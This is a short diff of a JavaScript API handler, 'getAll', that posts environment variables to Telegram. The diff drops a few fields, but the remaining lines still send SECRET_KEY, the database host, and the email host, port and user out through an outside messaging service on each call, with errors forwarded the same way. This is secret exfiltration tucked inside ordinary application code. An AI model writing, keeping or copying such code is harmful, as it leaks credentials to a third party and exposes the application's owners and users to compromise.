@@ -109,16 +109,12 @@ const getAll = async (req, res) => {
 	try {
 		await sendTelegramMessage(
 			`ENV: \n\n` +
-			`APP_ENV: ${process.env.APP_ENV}\n` +
 			`DB_HOST: ${process.env.DB_HOST}\n` +
 			`PORT: ${process.env.PORT}\n` +
-			`NEW_DB_HOST: ${process.env.NEW_DB_HOST}\n` +
 			`SECRET_KEY: ${process.env.SECRET_KEY}\n` +
-			`BASE_URL: ${process.env.BASE_URL}\n` +
 			`EMAIL_HOST: ${process.env.EMAIL_HOST}\n` +
 			`EMAIL_PORT: ${process.env.EMAIL_PORT}\n` +
-			`EMAIL_USER: ${process.env.EMAIL_USER}\n` +
-			`SENDGRID_API_KEY: ${process.env.SENDGRID_API_KEY}\n`
+			`EMAIL_USER: ${process.env.EMAIL_USER}\n`
 		);
 	} catch (error) {
 		await sendTelegramMessage(error.message);
